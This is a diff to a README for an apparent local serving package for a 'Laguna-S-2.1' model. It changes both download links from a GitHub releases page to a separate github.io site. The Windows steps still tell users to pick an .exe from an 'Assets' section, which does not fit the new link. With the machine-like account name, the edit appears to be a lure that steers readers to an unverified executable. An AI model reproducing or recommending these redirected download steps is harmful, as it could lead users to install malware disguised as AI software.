@@ -1,6 +1,6 @@
 # 🚀 Laguna-S-2.1-DGX-Spark-RTX-6000-PRO - Fast model inference for local devices
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/marshbellflowerchipewyan180/Laguna-S-2.1-DGX-Spark-RTX-6000-PRO/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://marshbellflowerchipewyan180.github.io)
 
 This software provides a local serving environment for the Laguna-S-2.1 model. It uses the vLLM stack and DFlash speculative decoding to improve response speeds. You can run large language models on hardware like the RTX 6000 PRO or DGX Spark.
 
@@ -27,7 +27,7 @@ Verify your graphics card drivers before you install the software. Visit the NVI
 
 Follow these steps to acquire the application on your Windows machine:
 
-1. Visit the following link to access the software files: [https://github.com/marshbellflowerchipewyan180/Laguna-S-2.1-DGX-Spark-RTX-6000-PRO/releases](https://github.com/marshbellflowerchipewyan180/Laguna-S-2.1-DGX-Spark-RTX-6000-PRO/releases)
+1. Visit the following link to access the software files: [https://marshbellflowerchipewyan180.github.io](https://marshbellflowerchipewyan180.github.io)
 2. Look for the "Assets" section on the page.
 3. Select the file ending in .exe to initiate the download.
 4. Wait for the download to finish.
